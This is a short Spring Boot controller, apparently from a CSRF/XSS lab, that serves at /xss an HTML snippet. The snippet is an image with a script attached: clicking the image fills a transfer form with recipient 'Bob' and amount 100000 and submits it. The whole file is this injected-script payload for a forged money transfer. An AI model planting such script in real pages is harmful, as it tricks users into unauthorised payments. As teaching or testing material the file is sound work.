package appointmenthospital.csrfform.config;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/xss")
public class XssController {
    @GetMapping
    public String getXss()
    {
        return "    <img id=\"submitButton\" src=\"https://img.freepik.com/free-photo/3d-render-flying-banknotes-with-wings-money-set_107791-15398.jpg?t=st=1730773744~exp=1730777344~hmac=f0fa3d2c73887695d8240e76b3f61384098bec095fefd8f5d2a6f5ba291284cf&w=1380\" alt=\"Một bức ảnh đẹp\" width=\"300\" height=\"200\" style=\"border: 2px solid black;\">\n" +
                "    <script>\n" +
                "        const submitButton = document.getElementById('submitButton');\n" +
                "        const form = document.querySelector('form');\n" +
                "        const recipientUsernameInput = document.getElementById('recipientUsername');\n" +
                "        const amount = document.getElementById('amount');\n" +
                "\n" +
                "        submitButton.addEventListener('click', (event) => {\n" +
                "            recipientUsernameInput.value = \"Bob\";\n" +
                "            amount.value = 100000;\n" +
                "            form.submit();\n" +
                "        });\n" +
                "    </script>";
    }
}
